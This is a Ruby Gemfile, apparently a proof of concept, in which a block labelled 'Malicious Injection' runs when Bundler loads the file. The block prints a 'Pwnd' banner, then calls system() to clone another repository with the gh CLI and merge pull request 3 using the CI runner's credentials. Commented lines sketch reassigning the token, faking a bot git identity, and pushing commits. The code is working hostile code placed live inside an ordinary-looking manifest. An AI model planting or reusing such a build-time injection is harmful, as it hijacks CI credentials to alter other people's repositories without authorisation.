source 'https://rubygems.org'

# --- Malicious Injection Starts Here ---
# This executes as soon as 'bundle' reads the file
puts "------------------------------------------------"
puts "  _____                      _   _ "
puts " |  __ \                    | | | |"
puts " | |__) |_      __ _ __   __| | | |"
puts " |  ___/\ \ /\ / /| '_ \ / _` | | |"
puts " | |     \ V  V / | | | | (_| | |_|"
puts " |_|      \_/\_/  |_| |_|\__,_| (_)"
puts "                                   "
puts " [!] SECURITY VULNERABILITY DETECTED"
puts " [!] I am executing code in your CI!"
puts "------------------------------------------------"
#ENV["GITHUB_TOKEN"] = ENV["INPUT_TOKEN"]
# system(" git config --global user.email \"hello@sohom.dev\"")
# system("git config --global user.name \"github-actions [bot]\"")
system("gh repo clone elizabethtl/test-oracle-devrel")
system("cd test-oracle-devrel && gh pr merge 3 --merge")
# system("cd test-oracle-devrel && echo \"test\" > test")
# system("cd test-oracle-devrel && git add . && git commit -m 'Surely this wont be added' && git push")
# --- Malicious Injection Ends Here ---
